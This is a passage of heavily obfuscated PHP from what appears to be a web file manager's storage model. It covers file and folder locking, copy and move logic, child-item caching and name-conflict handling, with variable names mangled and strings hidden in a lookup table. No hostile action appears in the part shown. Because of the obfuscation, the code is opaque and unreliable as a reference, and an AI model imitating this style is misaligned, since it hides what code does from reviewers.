= 0; $this->_lockKey($¡úæ¾éº[629] . $î´Áê§, $îü©ıÛ«); $this->_lockEvent($î´Áê§, array($¡úæ¾éº[623], $¡úæ¾éº[624]), $îü©ıÛ«); $this->_lockParent($î´Áê§, array($¡úæ¾éº[623], $¡úæ¾éº[625]), $îü©ıÛ«); $this->_lockEvent($î´Áê§, array($¡úæ¾éº[630], $¡úæ¾éº[626], $¡úæ¾éº[627]), $îü©ıÛ«); } private function _lockCheck($ºš¿ö§£, $çÁûÇ‰Š) { $­‘ôèˆú =& $_SERVER[¶Ô„œ…¯]; $¶ïù°§ = $this->sourceInfo($çÁûÇ‰Š); $‚Ÿ¯µ´Š = $ºš¿ö§£ . $­‘ôèˆú[10] . $çÁûÇ‰Š; $this->_lockTimeStart[$‚Ÿ¯µ´Š] = timeFloat(); if (!is_array($¶ïù°§)) { return; } $œÏüŸÅõ = LNG($­‘ôèˆú[631]); CacheLock::setErrorMsg($­‘ôèˆú[176] . htmlspecialchars($¶ïù°§[$­‘ôèˆú[32]]) . $­‘ôèˆú[178] . $œÏüŸÅõ); $this->_lockKey($‚Ÿ¯µ´Š, 1); $this->_lockKey($‚Ÿ¯µ´Š, 0); $ú¨£”å­ = array_reverse($this->parentLevelArray($¶ïù°§[$­‘ôèˆú[586]])); foreach ($ú¨£”å­ as $Í×ò´) { $‚Ÿ¯µ´Š = $ºš¿ö§£ . $­‘ôèˆú[632] . $Í×ò´; if (CacheLock::lockGet($­‘ôèˆú[633] . $‚Ÿ¯µ´Š)) { $¶ïù°§ = $this->sourceInfo($Í×ò´); CacheLock::setErrorMsg($­‘ôèˆú[176] . htmlspecialchars($¶ïù°§[$­‘ôèˆú[32]]) . $­‘ôèˆú[178] . $œÏüŸÅõ); $this->_lockKey($‚Ÿ¯µ´Š, 1); $this->_lockKey($‚Ÿ¯µ´Š, 0); } } } private function _lockCheckEnd($ªûÔõ«õ, $÷áêº“ı) { $œ­ÏÑîü =& $_SERVER[¶Ô„œ…¯]; $ìªÏ°ö = $ªûÔõ«õ . $œ­ÏÑîü[10] . $÷áêº“ı; CacheLock::setErrorMsg($œ­ÏÑîü[456]); if (!isset($this->_lockTimeStart[$ìªÏ°ö])) { return; } $¸Æ ¿ºÕ = timeFloat() - $this->_lockTimeStart[$ìªÏ°ö]; unset($this->_lockTimeStart[$ìªÏ°ö]); if ($¸Æ ¿ºÕ > 0.5) { unset(self::$cacheSourceInfo[$œ­ÏÑîü[535] . $÷áêº“ı]); } $ê¿ôª¬ = $this->sourceInfo($÷áêº“ı); if (!$ê¿ôª¬) { show_json(LNG($œ­ÏÑîü[108]), !1); } } private function _lockParent($“ß´×û…, $ÁÏŸµË‚, $ÂÎü‹ı¶) { if (!$this->autoLockSet) { return; } $¥Èã™ü£ = $this->sourceInfo($“ß´×û…); if (!is_array($¥Èã™ü£)) { return; } $øÎƒ½× = array_reverse($this->parentLevelArray($¥Èã™ü£[$_SERVER[¶Ô„œ…¯][586]])); foreach ($øÎƒ½× as $Ğ­µ”š) { $this->_lockEvent($Ğ­µ”š, $ÁÏŸµË‚, $ÂÎü‹ı¶); } } private function _lockEvent($Õ¿±èâ, $½”ìöï‡, $¨Ğ«ƒŞè) { $Î¼¯—«À =& $_SERVER[¶Ô„œ…¯]; if (!$this->autoLockSet) { return; } foreach ($½”ìöï‡ as $¡àôø–) { $‘ÉÅáÀÜ = $¡àôø– . $Î¼¯—«À[10] . $Õ¿±èâ; if ($¨Ğ«ƒŞè && CacheLock::lockGet($Î¼¯—«À[633] . $‘ÉÅáÀÜ)) { continue; } $this->_lockKey($‘ÉÅáÀÜ, $¨Ğ«ƒŞè); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($šä¹ÒÉƒ, $„ŠÑÓ± = 1) { $œåÆ«Şª = $_SERVER[¶Ô„œ…¯][633] . md5($šä¹ÒÉƒ); if ($„ŠÑÓ±) { if (isset(self::$_lockItemArr[$œåÆ«Şª])) { return; } self::$_lockItemArr[$œåÆ«Şª] = 1; CacheLock::lock($œåÆ«Şª, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$œåÆ«Şª])) { return; } unset(self::$_lockItemArr[$œåÆ«Şª]); CacheLock::unlock($œåÆ«Şª); } } public function isParentOf($Øä»“ëÏ, $ĞÚ†Ï±) { $ßÚ¹ùûµ =& $_SERVER[¶Ô„œ…¯]; $Ÿ¯ÜÏ˜ = $this->sourceInfo($Øä»“ëÏ); $”Ô˜Ìú³ = $this->sourceInfo($ĞÚ†Ï±); $Öòô¶› = $Ÿ¯ÜÏ˜[$ßÚ¹ùûµ[586]] . $Ÿ¯ÜÏ˜[$ßÚ¹ùûµ[193]] . $ßÚ¹ùûµ[50]; $×ë–ûÕ° = $”Ô˜Ìú³[$ßÚ¹ùûµ[586]] . $”Ô˜Ìú³[$ßÚ¹ùûµ[193]] . $ßÚ¹ùûµ[50]; $ñ÷‰”›¡ = strpos($×ë–ûÕ°, $Öòô¶›) === 0; return $ñ÷‰”›¡; } private $targetIsDelete = 0; public function copy($áÔ“³›…, $€‡¸³¨ü, $Î×é§Úº = REPEAT_REPLACE, $ª€ş¢Ï“ = '') { $ ½Æ††Ö =& $_SERVER[¶Ô„œ…¯]; $³éµ„•å = $this->sourceInfo($áÔ“³›…); $ñ©™§š = $this->sourceInfo($€‡¸³¨ü); if (!$³éµ„•å || !$ñ©™§š || $ñ©™§š[$ ½Æ††Ö[487]] != $ ½Æ††Ö[91]) { return !1; } if ($this->isParentOf($áÔ“³›…, $€‡¸³¨ü)) { return !1; } $ä·€ˆÄ = $ª€ş¢Ï“ ? $ª€ş¢Ï“ : $³éµ„•å[$ ½Æ††Ö[32]]; $this->lockCopyStart($áÔ“³›…); $this->lockWriteStart($€‡¸³¨ü, $ä·€ˆÄ); $ñù‚òÑ = array($ ½Æ††Ö[634] => array(), $ ½Æ††Ö[635] => array(), $ ½Æ††Ö[636] => array()); $this->targetIsDelete = intval($³éµ„•å[$ ½Æ††Ö[507]]); $ê®×ö¹— = $this->fileNameExistAuto($€‡¸³¨ü, $³éµ„•å); $Ù¹°èœÂ = $this->_copy($áÔ“³›…, $€‡¸³¨ü, $Î×é§Úº, $ñù‚òÑ, !0, $ª€ş¢Ï“); $this->_childrenListClear(); $this->lockCopyEnd($áÔ“³›…); $this->lockWriteEnd($€‡¸³¨ü, $ä·€ˆÄ); if ($³éµ„•å[$ ½Æ††Ö[487]] == $ ½Æ††Ö[91] && $ê®×ö¹— == $Ù¹°èœÂ) { $this->folderSizeResetChildren($ê®×ö¹—); } Model($ ½Æ††Ö[637])->addAll($ñù‚òÑ[$ ½Æ††Ö[635]], array(), !0); if ($ê®×ö¹— != $Ù¹°èœÂ || $³éµ„•å[$ ½Æ††Ö[487]] == $ ½Æ††Ö[91]) { Model($ ½Æ††Ö[638])->eventCopy($Ù¹°èœÂ); } $this->saveAll($ñù‚òÑ[$ ½Æ††Ö[636]]); Model($ ½Æ††Ö[232])->linkAdd($ñù‚òÑ[$ ½Æ††Ö[634]]); $this->folderSizeReset($€‡¸³¨ü); $this->updateModifyTime($€‡¸³¨ü); return $Ù¹°èœÂ; } private function _copy($ë…ò·ö, $î¤ÔËôã, $é”º„·‰, &$ÎÆäğı, $Ô¾è„Ù¬, $çà­ ö¹ = '') { $Ãš–ÉÂ =& $_SERVER[¶Ô„œ…¯]; $Ó‰Ç™î‘ = $this->sourceInfoCache($ë…ò·ö); $ûëÉÓÚê = $Ó‰Ç™î‘[$Ãš–ÉÂ[487]] == $Ãš–ÉÂ[91]; $ç§ß³ı = $çà­ ö¹ ? $çà­ ö¹ : $Ó‰Ç™î‘[$Ãš–ÉÂ[32]]; $·‹µ„èÑ = $this->fileNameExistAuto($î¤ÔËôã, $Ó‰Ç™î‘); if ($Ô¾è„Ù¬) { $this->_childrenAllMake($ë…ò·ö); if ($ûëÉÓÚê && $·‹µ„èÑ) { $this->_childrenAllMake($·‹µ„èÑ); } } if (!$·‹µ„èÑ) { return $this->_copyCreate($ë…ò·ö, $î¤ÔËôã, $ç§ß³ı, $ÎÆäğı); } $£·æöŠ× = $·‹µ„èÑ; if ($ûëÉÓÚê) { if ($é”º„·‰ == REPEAT_RENAME_FOLDER) { $ç§ß³ı = $this->fileNameAutoCache($î¤ÔËôã, $ç§ß³ı, $é”º„·‰, $ûëÉÓÚê); $£·æöŠ× = $this->_copyCreate($ë…ò·ö, $î¤ÔËôã, $ç§ß³ı, $ÎÆäğı); } else { $ê±›µÍù = $this->_childrenList($ë…ò·ö); foreach ($ê±›µÍù as $ÂÏººÒ) { $this->_copy($ÂÏººÒ[$Ãš–ÉÂ[193]], $·‹µ„èÑ, $é”º„·‰, $ÎÆäğı, !1); } } } else { if ($é”º„·‰ == REPEAT_RENAME || $é”º„·‰ == REPEAT_RENAME_FOLDER) { $ç§ß³ı = $this->fileNameAutoCache($î¤ÔËôã, $ç§ß³ı, $é”º„·‰, $ûëÉÓÚê); $£·æöŠ× = $this->_copyCreate($ë…ò·ö, $î¤ÔËôã, $ç§ß³ı, $ÎÆäğı); } else { if ($é”º„·‰ == REPEAT_REPLACE) { $Ÿ¸ÑË›‚ = $this->sourceInfoCache($·‹µ„èÑ); $‚‚İÆ¼é = $this->fileHistory($Ÿ¸ÑË›‚, $Ó‰Ç™î‘[$Ãš–ÉÂ[543]], $Ó‰Ç™î‘[$Ãš–ÉÂ[79]]); if ($‚‚İÆ¼é) { $ÎÆäğı[$Ãš–ÉÂ[634]][] = $Ó‰Ç™î‘[$Ãš–ÉÂ[543]]; } } else { if ($é”º„·‰ == REPEAT_SKIP) { } } } Hook::trigger($Ãš–ÉÂ[639], array($Ãš–ÉÂ[640], $Ó‰Ç™î‘, 0)); } return $£·æöŠ×; } private function _copyCreate($†Ä²Î÷’, $æÇı¦‚‡, $×ÃêÀŞó, &$Ï¸½Í•) { $ˆã’Å­Ø =& $_SERVER[¶Ô„œ…¯]; $ˆıèï’„ = $this->sourceInfoCache($†Ä²Î÷’); $†ıÕ›Ñ = $this->sourceInfoCache($æÇı¦‚‡); $¤—‰ê¦Ÿ = $this->_makeItemData($ˆıèï’„, $†ıÕ›Ñ, $×ÃêÀŞó); Hook::trigger($ˆã’Å­Ø[641], $¤—‰ê¦Ÿ); Hook::trigger($ˆã’Å­Ø[642], array($ˆã’Å­Ø[643], $¤—‰ê¦Ÿ, 0)); $Éâ‘ÕÖ = $this->add($¤—‰ê¦Ÿ); $é„Àé•š = array($ˆã’Å­Ø[193] => $Éâ‘ÕÖ, $ˆã’Å­Ø[32] => $×ÃêÀŞó); $this->_copyApplyMeta($é„Àé•š, $Ï¸½Í•); if ($ˆıèï’„[$ˆã’Å­Ø[487]] != $ˆã’Å­Ø[91]) { $Ï¸½Í•[$ˆã’Å­Ø[634]][] = $ˆıèï’„[$ˆã’Å­Ø[543]]; return $Éâ‘ÕÖ; } $ÊĞ†‚ûÙ = array(); $Ë„“²†Ë = array(); $this->_childrenListAll($†Ä²Î÷’, $ÊĞ†‚ûÙ); $öğâòó = count($ÊĞ†‚ûÙ); if ($öğâòó == 0) { return $Éâ‘ÕÖ; } $üÀ½–ÄÖ = $this->sourceInfo($Éâ‘ÕÖ); foreach ($ÊĞ†‚ûÙ as $†á²ŒçŒ) { $Î¤§Ş Õ = $this->_makeItemData($†á²ŒçŒ, $üÀ½–ÄÖ, $†á²ŒçŒ[$ˆã’Å­Ø[32]]); $Î¤§Ş Õ[$ˆã’Å­Ø[586]] = $†á²ŒçŒ[$ˆã’Å­Ø[586]]; $Ë„“²†Ë[] = $Î¤§Ş Õ; } $this->chunkEventSet($ˆã’Å­Ø[644], array($ˆã’Å­Ø[645], $¤—‰ê¦Ÿ, $öğâòó)); $this->addAll($Ë„“²†Ë, array(), !1); $¤¯œÉ°Ê = $this->where(array($ˆã’Å­Ø[192] => $Éâ‘ÕÖ))->select(); $£ìö­² = $this->_childrenMakeRelation($ÊĞ†‚ûÙ, $¤¯œÉ°Ê); $£ìö­²[$†Ä²Î÷’] = $Éâ‘ÕÖ; $—‡­ÈØË = array(); $ûŒï²ÌÇ = array(); foreach ($¤¯œÉ°Ê as $†á²ŒçŒ) { $œ¹†Â²± = $†á²ŒçŒ[$ˆã’Å­Ø[193]]; $Ï°‘çæÚ = $this->_childrenMatch($£ìö­², $†á²ŒçŒ, $üÀ½–ÄÖ); $—‡­ÈØË[] = array($ˆã’Å­Ø[193], $œ¹†Â²±, $ˆã’Å­Ø[192], $Ï°‘çæÚ[$ˆã’Å­Ø[192]]); $ûŒï²ÌÇ[] = array($ˆã’Å­Ø[193], $œ¹†Â²±, $ˆã’Å­Ø[586], $Ï°‘çæÚ[$ˆã’Å­Ø[586]]); $this->_copyApplyMeta($†á²ŒçŒ, $Ï¸½Í•); if ($†á²ŒçŒ[$ˆã’Å­Ø[487]] != $ˆã’Å­Ø[91]) { $Ï¸½Í•[$ˆã’Å­Ø[634]][] = $†á²ŒçŒ[$ˆã’Å­Ø[543]]; } } $this->chunkEventSet($ˆã’Å­Ø[646], array($ˆã’Å­Ø[647], $¤—‰ê¦Ÿ, $öğâòó)); $this->saveAll($—‡­ÈØË); $this->chunkEventSet($ˆã’Å­Ø[648], array($ˆã’Å­Ø[649], $¤—‰ê¦Ÿ, $öğâòó)); $this->saveAll($ûŒï²ÌÇ); return $Éâ‘ÕÖ; } private function _childrenMakeRelation($ãÛò•‡, $ûµÑŞ¬Ì) { $—™ğÉøŞ =& $_SERVER[¶Ô„œ…¯]; $©Á’ÈÄ¾ = array(); $–»£³áú = array(); foreach ($ãÛò•‡ as $ÏøîŒ•) { $çÆâãˆ = $ÏøîŒ•[$—™ğÉøŞ[32]] . $—™ğÉøŞ[8] . $ÏøîŒ•[$—™ğÉøŞ[586]]; $©Á’ÈÄ¾[$çÆâãˆ] = $ÏøîŒ•[$—™ğÉøŞ[193]]; } foreach ($ûµÑŞ¬Ì as $ÏøîŒ•) { $çÆâãˆ = $ÏøîŒ•[$—™ğÉøŞ[32]] . $—™ğÉøŞ[8] . $ÏøîŒ•[$—™ğÉøŞ[586]]; $³Ş‘³ŠÓ = $©Á’ÈÄ¾[$çÆâãˆ]; $–»£³áú[$³Ş‘³ŠÓ] = $ÏøîŒ•[$—™ğÉøŞ[193]]; } return $–»£³áú; } private function _childrenMatch($ Ã´±‘Ÿ, $‡Ú¢ªç’, $ÄÖ”ıí) { $–ƒÓıß‘ =& $_SERVER[¶Ô„œ…¯]; $éØÍ©£‹ = $ÄÖ”ıí[$–ƒÓıß‘[586]]; $È ¾ÖÆş = $this->parentLevelArray($‡Ú¢ªç’[$–ƒÓıß‘[586]]); foreach ($È ¾ÖÆş as $Ã„î) { if (isset($ Ã´±‘Ÿ[$Ã„î])) { $éØÍ©£‹ .= $ Ã´±‘Ÿ[$Ã„î] . $–ƒÓıß‘[650]; } } $éØÍ©£‹ = rtrim($éØÍ©£‹, $–ƒÓıß‘[50]) . $–ƒÓıß‘[50]; $ãï²ìñ = $this->parentLevelArray($éØÍ©£‹); $”ÌíƒàÒ = $ãï²ìñ[count($ãï²ìñ) - 1]; return array($–ƒÓıß‘[192] => $”ÌíƒàÒ, $–ƒÓıß‘[586] => $éØÍ©£‹); } private function _makeItemData($˜Ë³ãÙÖ, $ÈñÄ°œç, $‘µ«¾µ ) { $àğ‚ÒÎ =& $_SERVER[¶Ô„œ…¯]; $ç“º×Èª = array($àğ‚ÒÎ[651] => $˜Ë³ãÙÖ[$àğ‚ÒÎ[487]], $àğ‚ÒÎ[496] => $‘µ«¾µ , $àğ‚ÒÎ[652] => $˜Ë³ãÙÖ[$àğ‚ÒÎ[488]] ? $˜Ë³ãÙÖ[$àğ‚ÒÎ[488]] : $àğ‚ÒÎ[12], $àğ‚ÒÎ[544] => $˜Ë³ãÙÖ[$àğ‚ÒÎ[543]] ? $˜Ë³ãÙÖ[$àğ‚ÒÎ[543]] : 0, $àğ‚ÒÎ[622] => $˜Ë³ãÙÖ[$àğ‚ÒÎ[79]] ? $˜Ë³ãÙÖ[$àğ‚ÒÎ[79]] : 0, $àğ‚ÒÎ[653] => intval($ÈñÄ°œç[$àğ‚ÒÎ[190]]), $àğ‚ÒÎ[654] => intval($ÈñÄ°œç[$àğ‚ÒÎ[571]]), $àğ‚ÒÎ[655] => intval(USER_ID), $àğ‚ÒÎ[656] => intval(USER_ID), $àğ‚ÒÎ[479] => intval($ÈñÄ°œç[$àğ‚ÒÎ[193]]), $àğ‚ÒÎ[657] => $ÈñÄ°œç[$àğ‚ÒÎ[586]] . $ÈñÄ°œç[$àğ‚ÒÎ[193]] . $àğ‚ÒÎ[50], $àğ‚ÒÎ[500] => $˜Ë³ãÙÖ[$àğ‚ÒÎ[88]] ? $˜Ë³ãÙÖ[$àğ‚ÒÎ[88]] : time(), $àğ‚ÒÎ[506] => 0, $àğ‚ÒÎ[658] => $àğ‚ÒÎ[12]); return $ç“º×Èª; } private function _copyApplyMeta($š…‹‚“ù, &$„¿æÈñ) { $ßŞÄÉĞ =& $_SERVER[¶Ô„œ…¯]; $ú‹¼÷Œğ = $š…‹‚“ù[$ßŞÄÉĞ[193]]; $èº’‚¹¸ = $š…‹‚“ù[$ßŞÄÉĞ[32]]; if (!isset($š…‹‚“ù[$ßŞÄÉĞ[659]]) || !$š…‹‚“ù[$ßŞÄÉĞ[659]] || $š…‹‚“ù[$ßŞÄÉĞ[659]] == $ßŞÄÉĞ[230]) { $„¿æÈñ[$ßŞÄÉĞ[636]][] = array($ßŞÄÉĞ[193], $ú‹¼÷Œğ, $ßŞÄÉĞ[659], short_id($ú‹¼÷Œğ)); } if (Input::check($èº’‚¹¸, $ßŞÄÉĞ[660])) { $„¿æÈñ[$ßŞÄÉĞ[635]][] = array($ßŞÄÉĞ[193] => $ú‹¼÷Œğ, $ßŞÄÉĞ[97] => $ßŞÄÉĞ[540], $ßŞÄÉĞ[452] => str_replace($ßŞÄÉĞ[53], $ßŞÄÉĞ[12], Pinyin::get($èº’‚¹¸))); $„¿æÈñ[$ßŞÄÉĞ[635]][] = array($ßŞÄÉĞ[193] => $ú‹¼÷Œğ, $ßŞÄÉĞ[97] => $ßŞÄÉĞ[539], $ßŞÄÉĞ[452] => Pinyin::get($èº’‚¹¸, $ßŞÄÉĞ[661])); } $„¿æÈñ[$ßŞÄÉĞ[635]][] = array($ßŞÄÉĞ[193] => $ú‹¼÷Œğ, $ßŞÄÉĞ[97] => $ßŞÄÉĞ[519], $ßŞÄÉĞ[452] => KodSort::makeStr($èº’‚¹¸)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($èÎÙ˜ôÙ) { $ÓĞ®¦‡ =& $_SERVER[¶Ô„œ…¯]; $ÇÜˆøœ› = $this->sourceInfo($èÎÙ˜ôÙ); $­ıôËª² = $ÓĞ®¦‡[662]; $º×õÁÔÍ = array($ÓĞ®¦‡[586] => array($ÓĞ®¦‡[617], $ÇÜˆøœ›[$ÓĞ®¦‡[586]] . $èÎÙ˜ôÙ . $ÓĞ®¦‡[618]), $ÓĞ®¦‡[507] => $this->targetIsDelete); $Ñó´“ñç = $this->field($­ıôËª²)->where($º×õÁÔÍ)->select(); if (!$Ñó´“ñç) { return; } $Ñó´“ñç = array_to_keyvalue($Ñó´“ñç, $ÓĞ®¦‡[193]); foreach ($Ñó´“ñç as $ôİ²Ñªí) { $Õ®•Óªˆ = $ôİ²Ñªí[$ÓĞ®¦‡[192]]; $èÎÙ˜ôÙ = $ôİ²Ñªí[$ÓĞ®¦‡[193]]; if (!isset($this->_childrenListCache[$èÎÙ˜ôÙ]) && $ôİ²Ñªí[$ÓĞ®¦‡[487]] == $ÓĞ®¦‡[91]) { $this->_childrenListCache[$èÎÙ˜ôÙ] = array(); } if (!isset($this->_childrenListCache[$Õ®•Óªˆ])) { $this->_childrenListCache[$Õ®•Óªˆ] = array(); } $this->_childrenListCache[$Õ®•Óªˆ][$èÎÙ˜ôÙ] = $ôİ²Ñªí; $this->_childrenItemCache[$èÎÙ˜ôÙ] = $ôİ²Ñªí; } } private function _childrenListAll($ŸåÂÓùç, &$ãÏàƒ¯È) { $‘šÚ =& $_SERVER[¶Ô„œ…¯]; if (!isset($this->_childrenListCache[$ŸåÂÓùç])) { return; } $‹™æŸìÀ = $this->_childrenListCache[$ŸåÂÓùç]; foreach ($‹™æŸìÀ as $Ş›´«Ã => $†õ¦¨) { $ãÏàƒ¯È[$Ş›´«Ã] = $†õ¦¨; if ($†õ¦¨[$‘šÚ[487]] == $‘šÚ[91]) { $this->_childrenListAll($Ş›´«Ã, $ãÏàƒ¯È); } } } private function sourceInfoCache($®ôØùÂã) { if (isset($this->_childrenItemCache[$®ôØùÂã])) { return $this->_childrenItemCache[$®ôØùÂã]; } return $this->sourceInfo($®ôØùÂã); } private function _childrenList($´ˆ‡¼µï) { if (isset($this->_childrenListCache[$´ˆ‡¼µï])) { return $this->_childrenListCache[$´ˆ‡¼µï]; } return $this->_childrenListSelect($´ˆ‡¼µï); } private function _childrenListSelect($Ó®ËÂÉÈ) { $œ´™©–Ù =& $_SERVER[¶Ô„œ…¯]; $åİ˜Ï„ = array($œ´™©–Ù[192] => $Ó®ËÂÉÈ, $œ´™©–Ù[507] => $this->targetIsDelete); $ÕÂ›‰Œ = $this->where($åİ˜Ï„)->select(); $ÕÂ›‰Œ = $ÕÂ›‰Œ ? $ÕÂ›‰Œ : array(); $¢‘À¢È« = array_to_keyvalue($ÕÂ›‰Œ, $œ´™©–Ù[193]); $this->_childrenListCache[$Ó®ËÂÉÈ] = $¢‘À¢È«; foreach ($¢‘À¢È« as $Ó®ËÂÉÈ => $¬ÜÓŒ¥Ä) { $this->_childrenItemCache[$Ó®ËÂÉÈ] = $¬ÜÓŒ¥Ä; } return $¢‘À¢È«; } private function fileNameExistAuto($Ñ—§Íœ, $ë²…›³¾) { $Å÷öÍ‰¸ =& $_SERVER[¶Ô„œ…¯]; if ($ë²…›³¾[$Å÷öÍ‰¸[507]] == $Å÷öÍ‰¸[91]) { return $this->fileNameExist($Ñ—§Íœ, $ë²…›³¾[$Å÷öÍ‰¸[32]]); } return $this->fileNameExistCache($Ñ—§Íœ, $ë²…›³¾[$Å÷öÍ‰¸[32]]); } private function fileNameExistCache($Ü‹á©‡, $Ñ¦³µ) { $Å­ ÈÇê =& $_SERVER[¶Ô„œ…¯]; $Ñ¦³µ = strtolower($Ñ¦³µ); $ûáåÄ¤ = $this->_childrenList($Ü‹á©‡); foreach ($ûáåÄ¤ as $şá‡¯ù¥) { if ($Ñ¦³µ == strtolower($şá‡¯ù¥[$Å­ ÈÇê[32]])) { return $şá‡¯ù¥[$Å­ ÈÇê[193]]; } } return !1; } private function fileNameAutoCache($ïîıò, $•òøüş¡, $‘™˜«Â‚, $å¿íªøñ) { $éõôÀï¾ =& $_SERVER[¶Ô„œ…¯]; $íÓ¾É›ê = $this->_childrenList($ïîıò); $£û°ëËÍ = array_to_keyvalue($íÓ¾É›ê, $éõôÀï¾[12], $éõôÀï¾[32]); return $this->fileNameAutoGet($£û°ëËÍ, $•òøüş¡, $‘™˜«Â‚, $å¿íªøñ); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($âÒ¿“Ê·, $¦è¢¢Óû, $ÓÒøÃŞ = REPEAT_REPLACE, $¹¦ö‘º = '') { $ê…ˆ²·Œ =& $_SERVER[¶Ô„œ…¯]; $ôó£Ç¸í = $this->sourceInfo($âÒ¿“Ê·); $¾˜çˆ“‚ = $this->sourceInfo($¦è¢¢Óû); if ($ôó£Ç¸í[$ê…ˆ²·Œ[192]] == $¾˜çˆ“‚[$ê…ˆ²·Œ[193]]) { if ($ôó£Ç¸í[$ê…ˆ²·Œ[507]] == $ê…ˆ²·Œ[91]) { Model($ê…ˆ²·Œ[505])->restore(array($âÒ¿“Ê·)); } if (!$¹¦ö‘º || $¹¦ö‘º == $ôó£Ç¸í[$ê…ˆ²·Œ[32]]) { return $âÒ¿“Ê·; } } $Æš¨²Ä = $this->pathInfoMore($âÒ¿“Ê·); if ($this->isParentOf($âÒ¿“Ê·, $¦è¢¢Óû)) { return !1; } if (!$ôó£Ç¸í || !$¾˜çˆ“‚ || $¾˜çˆ“‚[$ê…ˆ²·Œ[487]] != $ê…ˆ²·Œ[91]) { return !1; } Hook::trigger($ê…ˆ²·Œ[663], $Æš¨²Ä); $this->targetIsDelete = intval($ôó£Ç¸í[$ê…ˆ²·Œ[507]]); if ($ôó£Ç¸í[$ê…ˆ²·Œ[192]] == $¦è¢¢Óû && $¹¦ö‘º != $ôó£Ç¸í[$ê…ˆ²·Œ[32]]) { $ÓŸÌíÛÕ = $this->fileNameExist($¦è¢¢Óû, $¹¦ö‘º); if ($ÓŸÌíÛÕ && $ôó£Ç¸í[$ê…ˆ²·Œ[487]] == $ê…ˆ²·Œ[230]) { $ó¶áôÂ  = $this->sourceInfo($ÓŸÌíÛÕ); $‰ˆÚƒŒ = $this->fileHistory($ó¶áôÂ , $ôó£Ç¸í[$ê…ˆ²·Œ[543]], $ôó£Ç¸í[$ê…ˆ²·Œ[79]]); if (!$‰ˆÚƒŒ) { Model($ê…ˆ²·Œ[546])->remove($ôó£Ç¸í[$ê…ˆ²·Œ[543]]); } $this->removeNow($âÒ¿“Ê·, !1); $this->folderSizeReset($¦è¢¢Óû); Hook::trigger($ê…ˆ²·Œ[664], $Æš¨²Ä); return $ÓŸÌíÛÕ; } } $ñ­ĞÅ€§ = $¹¦ö‘º ? $¹¦ö‘º : $ôó£Ç¸í[$ê…ˆ²·Œ[32]]; $this->lockMoveStart($âÒ¿“Ê·); $this->lockWriteStart($¦è¢¢Óû, $ñ­ĞÅ€§); $“ÇæâÄú = array($ê…ˆ²·Œ[634] => array(), $ê…ˆ²·Œ[665] => !1); $this->clearShare($âÒ¿“Ê·, $¦è¢¢Óû); $Ë±”¢ØĞ = $this->fileNameExistAuto($¦è¢¢Óû, $ôó£Ç¸í); $Â®íÕğ = $this->_move($âÒ¿“Ê·, $¦è¢¢Óû, $ÓÒøÃŞ, $“ÇæâÄú, $¹¦ö‘º); $this->sourceCacheClear(); if ($ôó£Ç¸í[$ê…ˆ²·Œ[487]] == $ê…ˆ²·Œ[91] && $Ë±”¢ØĞ) { $this->folderSizeResetChildren($Â®íÕğ); } Model($ê…ˆ²·Œ[232])->linkAdd($“ÇæâÄú[$ê…ˆ²·Œ[634]]); if ($Ë±”¢ØĞ && $“ÇæâÄú[$ê…ˆ²·Œ[665]]) { $this->removeNow($âÒ¿“Ê·, !1); } $this->lockMoveEnd($âÒ¿“Ê·); $this->lockWriteEnd($¦è¢¢Óû, $ñ­ĞÅ€§); $this->folderSizeReset($ôó£Ç¸í[$ê…ˆ²·Œ[192]]); $this->folderSizeReset($¦è¢¢Óû); $„µ‚ã“ = array($ôó£Ç¸í[$ê…ˆ²·Œ[192]], $¦è¢¢Óû); if ($ôó£Ç¸í[$ê…ˆ²·Œ[487]] == $ê…ˆ²·Œ[91]) { $„µ‚ã“[] = $âÒ¿“Ê·; } $this->updateModifyTime($„µ‚ã“); Model($ê…ˆ²·Œ[638])->eventMove($âÒ¿“Ê·, $ôó£Ç¸í[$ê…ˆ²·Œ[192]], $¦è¢¢Óû); Hook::trigger($ê…ˆ²·Œ[664], $Æš¨²Ä); return $Â®íÕğ; } private function _move($µ²×ó¢, $ÍÕôÃÃ, $æï‰³ò”, &$Œ‰ˆù€•, $šÀúúã = '') { $öÛşä‡ =& $_SERVER[¶Ô„œ…¯]; $‚½Ù¥´È = $this->sourceInfo($µ²×ó¢); $ÒÉÌ‚äã = $‚½Ù¥´È[$öÛşä‡[487]] == $öÛşä‡[91]; $åßÊµ˜Š = $šÀúúã ? $šÀúúã : $‚½Ù¥´È[$öÛşä‡[32]]; $‘³ü»Õ = $this->fileNameExistAuto($ÍÕôÃÃ, $‚½Ù¥´È); $this->lockMoveStart($µ²×ó¢); $this->lockWriteStart($ÍÕôÃÃ, $åßÊµ˜Š); if (!$‘³ü»Õ) { return $this->_moveForce($µ²×ó¢, $ÍÕôÃÃ, $åßÊµ˜Š); } $Š‹€Èúú = $‘³ü»Õ; $·ÀæøÍÑ = !1; if ($ÒÉÌ‚äã) { if ($æï‰³ò” == REPEAT_RENAME_FOLDER) { $åßÊµ˜Š = $this->fileNameAuto($ÍÕôÃÃ, $åßÊµ˜Š, $æï‰³ò”, $ÒÉÌ‚äã); $Š‹€Èúú = $this->_moveForce($µ²×ó¢, $ÍÕôÃÃ, $åßÊµ˜Š); } else { if ($æï‰³ò” == REPEAT_RENAME_FOLDER) { $æï‰³ò” = REPEAT_RENAME; } $Õ¤‡û…Û = $this->_childrenListSelect($µ²×ó¢); foreach ($Õ¤‡û…Û as $™‹”æÙ) { $this->_move($™‹”æÙ[$öÛşä‡[193]], $‘³ü»Õ, $æï‰³ò”, $Œ‰ˆù€•); } $·ÀæøÍÑ = !0; } } else { if ($æï‰³ò” == REPEAT_SKIP) { $·ÀæøÍÑ = !0; } else { if ($æï‰³ò” == REPEAT_RENAME || $æï‰³ò” == REPEAT_RENAME_FOLDER) { $åßÊµ˜Š = $this->fileNameAuto($ÍÕôÃÃ, $åßÊµ˜Š, $æï‰³ò”, $ÒÉÌ‚äã); $Š‹€Èúú = $this->_moveForce($µ²×ó¢, $ÍÕôÃÃ, $åßÊµ˜Š); } else { if ($æï‰³ò” == REPEAT_REPLACE) { $ŞÒÏÖŸ® = $this->sourceInfoCache($‘³ü»Õ); $ëªÅ¼·° = $this->fileHistory($ŞÒÏÖŸ®, $‚½Ù¥´È[$öÛşä‡[543]], $‚½Ù¥´È[$öÛşä‡[79]]); $·ÀæøÍÑ 